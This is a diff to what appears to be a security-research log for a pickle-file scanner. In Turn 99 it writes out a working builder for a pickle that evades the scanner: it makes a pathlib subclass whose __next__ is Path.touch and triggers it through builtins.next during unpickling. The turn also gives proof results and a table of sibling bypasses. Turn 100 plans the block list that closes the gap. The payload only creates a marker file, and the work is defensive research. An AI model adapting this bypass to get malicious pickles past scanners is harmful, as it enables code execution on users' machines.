@@ -5084,3 +5084,142 @@ Blocking plan:
 
 Performance note: two more literals in the existing magic-method matcher and
 one sorted global lookup entry; no context-manager flow modeling.
+
+## Turn 99 - Iteration protocol method family gap
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
+  paths.
+- Install `pathlib.Path.touch` as an iteration protocol method, for example
+  `__next__`.
+- Instantiate the class with a marker path.
+- Call the matching clean builtin helper, for example `builtins.next(instance)`,
+  during unpickling.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def s(data: bytes) -> bytes:
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    return b"U" + bytes([len(data)]) + data
+
+
+def sg(module: bytes, name: bytes) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_builtins_next_next_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg(b"builtins", b"type"),
+        b"(",
+        text("DerivedPath"),
+        sg(b"pathlib", b"PosixPath"),
+        b"\x85",
+        b"}",
+        text("__next__"),
+        sg(b"pathlib", b"Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg(b"builtins", b"next"),
+        b"h\x01\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12 for the `__next__` representative:
+
+- Control scanner result: `len=137`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=156`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=156`, `bytes_total=156`,
+  `opcode_count=33`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, and `builtins.next`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final `next` call returns a
+  `DerivedPath` instance at `/tmp/ma_builtins_next_next_marker` and does not
+  create the marker
+- Unpickle result: the full payload returns `None` and creates
+  `/tmp/ma_builtins_next_next_marker` with mode `0o644`
+
+Sibling slot proof:
+
+| Builtin | Method | Scanner verdict | Runtime result |
+| --- | --- | --- | --- |
+| `builtins.next` | `__next__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `builtins.reversed` | `__reversed__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `builtins.anext` | `__anext__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `builtins.iter` | `__iter__` | clean, 0 findings, 0 notices | marker created before `TypeError` |
+| `builtins.aiter` | `__aiter__` | clean, 0 findings, 0 notices | marker created before `TypeError` |
+
+RCE mechanism:
+
+- `type(...)` builds a `pathlib.PosixPath` subclass with an
+  attacker-controlled iteration hook such as `__next__ = pathlib.Path.touch`.
+- The payload instantiates that subclass for the marker path.
+- `builtins.next(instance)` dispatches to `instance.__next__()`.
+- Because `__next__` points at `Path.touch`, CPython calls
+  `Path.touch(instance)`, creating the marker path. `next`, `reversed`, and
+  `anext` accept the `None` result in these probes, so the payload returns
+  normally after execution.
+- `iter` and `aiter` enforce iterator return types after the hook returns, but
+  their side effects have already happened by the time the type check raises.
+
+Why the scanner missed it:
+
+- Iteration protocol dunder slots `__iter__`, `__next__`, `__reversed__`,
+  `__aiter__`, and `__anext__` are absent from the suspicious magic-method
+  string list.
+- The corresponding `builtins` helpers are absent from `DANGEROUS_GLOBALS`;
+  current builtin coverage focuses on direct code execution and callback
+  factories, not common protocol dispatch helpers.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The dangerous callable is hidden as a synthesized iteration protocol method,
+  so the final visible call target is a common builtin rather than the
+  attacker-selected callable.
+
+Performance note: the focused next block should add `__iter__`, `__next__`,
+`__reversed__`, `__aiter__`, and `__anext__` to the suspicious magic-method
+string list. That costs five literals in the existing string matcher and
+avoids flagging common `builtins.iter`/`next`/`reversed`/`aiter`/`anext` calls
+without an attacker-controlled protocol seed.
+
+## Turn 100 - Block iteration protocol seeds
+
+Blocking plan:
+
+- Add `__iter__`, `__next__`, `__reversed__`, `__aiter__`, and `__anext__` to
+  the existing suspicious magic-method string list. These hooks can route
+  execution through common builtin protocol dispatch without exposing the
+  attacker-selected callable as the final call target.
+- Leave `builtins.iter`, `builtins.next`, `builtins.reversed`,
+  `builtins.aiter`, and `builtins.anext` allowed for this focused block. The
+  static signal is the attacker-controlled iteration protocol slot name, which
+  avoids broad false positives on common benign builtin calls.
+- Add a CPython oracle regression for all five Turn 99 slots. The regression
+  verifies construction-only controls are suspicious and side-effect free,
+  verifies the active `next`, `reversed`, and `anext` variants are suspicious
+  and create markers while returning normally, and verifies the active `iter`
+  and `aiter` variants are suspicious and create markers before their builtin
+  return-type checks raise `TypeError`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: five literals in the existing magic-method matcher, no
+iteration protocol flow modeling or broad builtin blocklist additions.
